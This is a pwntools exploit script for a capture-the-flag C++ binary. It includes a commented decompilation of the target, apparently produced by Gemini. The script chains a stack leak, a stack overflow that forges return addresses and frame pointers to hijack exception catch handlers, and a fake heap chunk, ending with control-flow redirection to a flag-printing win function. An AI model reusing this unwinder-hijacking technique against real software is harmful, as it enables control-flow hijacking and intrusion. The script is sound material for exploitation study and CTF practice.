from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./chall_patched', env={'LD_PRELOAD': './libm.so.6'})
gdb.attach(p, '''
    # main's catch block
    b *0x401407
    # small_message's read
    b *0x4015f0
    # big_message's read
    b *0x4016a1
    # big_message's catch block
    b *0x401715
    continue
''')

# this challenge leverages an exploitation method called Catch Handler Oriented Programming (CHOP)

# reconstructed C++ code by Gemini:
'''
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <exception>

// Global variables inferred from usage
// 0x404020 range in assembly
void* messages[2]; // implied array size
int count = 0;

// 0x40144c
void setup() {
    setvbuf(stdout, nullptr, _IONBF, 0);
    setvbuf(stdin, nullptr, _IONBF, 0);
    setvbuf(stderr, nullptr, _IONBF, 0);
}

// 0x401773
void win() {
    FILE* fp = fopen("flag.txt", "r");
    if (!fp) {
        perror("fopen");
        exit(1);
    }
    char buf[0x100];
    while (fgets(buf, 0x100, fp)) {
        fputs(buf, stdout);
    }
    fclose(fp);
}

// 0x401834 - 0x40192b
// RAII Class to manage heap memory
class message {
public:
    char* buf;      // [this+0x0]
    bool allocated; // [this+0x8]

    // 0x401834
    message(int size) {
        this->allocated = true;
        this->buf = (char*)malloc(size); // 0x401866Catch Handler Oriented Programming
    }

    // 0x40188c
    ~message() {
        if (this->allocated && this->buf) {
            free(this->buf); // 0x4018c1
            this->buf = nullptr;
        }
    }

    // 0x4018e8
    char* release() {
        this->allocated = false; // Prevents destructor from freeing
        return this->buf;
    }
};

// 0x40159f
void small_message(int user_size) {
    // Buffer starts from [rbp-0x30].
    char buf[40];

    memset(buf, 0, 24);
    puts("Enter your message: ");

    // 0x4015f0: VULNERABILITY
    // Reads 0x100 bytes into a 0x28 buffer.
    ssize_t bytes_read = read(0, buf, 0x100);

    // 0x4015fb: Security Check AFTER the overflow has happened
    // If we want to overflow, we could overwrite Saved RBP and Return Address here.
    if (bytes_read > user_size) {
        // 0x40162b: THROW EXCEPTION
        // This could trigger the stack unwinding mechanism.
        // Because the stack can be corrupted, the unwinder could use our FAKE return address.
        throw "Buffer overflow detected!";
    }

    // 0x401637
    // Prints out what we have read in as a string.
    puts(buf);
}

// 0x401653
void big_message(int size) {
    // 0x40167e: Constructor called
    // [rbp-0x30] holds the message object.
    message msg(size);

    puts("Enter your message: ");

    // TRY BLOCK START (Based on .gcc_except_table Entry 2)
    // Range: ~0x4016a1 to ~0x4016fe
    try {
        // 0x4016a1: Read called
        // msg.buf is loaded from [rbp-0x30].
        // If we fake RIP to point here, unwinder could jump to catch block at 0x401715.
        read(0, msg.buf, size);

        msg.buf[size - 1] = 0;

        if (count <= 1) {
            messages[count++] = msg.release();
        }
    }
    // CATCH BLOCK (0x401715)
    // Triggered if we fake RIP to point inside the try block above.
    // The assembly compares rdx (type selector) to 1.
    catch (...) {
        // If rdx is 1, jump to 0x401724.
        // 0x401738
        puts("Read error!");

        // 0x401742: jmp 0x4016f7
        // The catch block swallows the exception
    }
    catch (...) {
        // If rdx is not 1, jump to 0x401750.
        // 0x401757: Destructor called
        // [rbp-0x30] holds the message object.
        ~message(&msg)

        // 0x401762: Another throw (_Unwind_Resume)
        // Tells the Unwinder: "I'm done cleaning up, please continue searching up the stack for the NEXT catch block."
    }

    // 0x4016fe: Destructor called
    // [rbp-0x30] holds the message object.
    ~message(&msg)
}

// 0x40152b
void enter_message() {
    int size;
    puts("Enter size: ");
    scanf("%d", &size);

    if (size > 32) {
        big_message(size);
    } else {
        small_message(size);
    }
}

// 0x4014e1
void menu() {
    puts("1. Enter message");
    puts("2. Exit");
}

// 0x401376
int main(int argc, char** argv) {
    setup();

    // TRY BLOCK START (Based on .gcc_except_table Entry 3)
    // Range: 0x401397 to 0x401405
    while (true) {
        try {
            // 0x401397
            menu();
            // If we fake RIP to point here, unwinder could jump to catch block at 0x401407.

            int choice;
            // 0x4013af
            // This could be a critical exploit primitive.
            // scanf writes to choice located at [rbp-0x1c].
            // If we pivot stack and land in this loop, 'rbp' is our controlled value.
            scanf("%d", &choice);

            if (choice == 1) {
                enter_message();
            } else if (choice == 2) {
                break;
            } else {
                puts("Invalid choice");
            }
        }
        // CATCH BLOCK (0x401407)
        // Triggered if we fake RIP to point inside the try block above.
        catch (...) {
            // 0x40141a
            puts("Error occurred try again!");

            // 0x401424: jmp 0x401397
            // The catch block swallows the exception and restarts the loop.
        }
    }

    puts("Your pain messages will be reviewed");
    puts("Bye");

    return 0;
}
'''

# if size is less than or equal to 0x20, call small_message to read data into stack
# otherwise, call big_message to read data into heap
def enter_message(size, data):
    p.sendlineafter(b"2. Exit\n", b'1')
    p.sendlineafter(b"Enter size: \n", str(size).encode())
    p.sendafter(b"Enter your message: \n", data)

# 1. leak stack address through puts to print out a string on stack
# call small_message and not trigger throw
enter_message(0x20, b'A'*0x18)
stack_addr = u64(p.recvline().strip()[-6:].ljust(8, b'\x00'))
log.info(f"stack address: {hex(stack_addr)}")

# 2. chop to hijack execution flow as small_message's try block -> big_message's catch block -> main's catch block -> main's try block
big_message_catch_rbp_val = stack_addr+0x30
small_message_return_addr = 0x4016a1+5  # must be an address within big_message's try block
main_rbp_val = 0x404800
fake_chunk_addr = big_message_catch_rbp_val-0x30+0x10  # assume a fake chunk of size 0x40, must satisfy *(big_message_catch_rbp_val-0x30)=&fake_chunk_addr
big_message_catch_return_addr = 0x401397+5  # must be an address within main's try block
# call small_message and trigger throw
enter_message(0x20, b'A'*0x30+p64(big_message_catch_rbp_val)+p64(small_message_return_addr)+b'A'*0x10+p64(fake_chunk_addr)+p64(0x40)+b'A'*0x20+p64(main_rbp_val)+p64(big_message_catch_return_addr))
# now tcache bin of size 0x40 is like fake_chunk_addr, next malloc(0x30) returns fake_chunk_addr

# 3. overwrite return address with win
win_addr = 0x401773
# call big_message, malloc(0x30)=fake_chunk_addr, and read(0, fake_chunk_addr, 0x30)
# make sure to check if fake_chunk_addr is equal to current big_message_rbp_val
enter_message(0x30, b'A'*0x8+p64(win_addr))

p.interactive()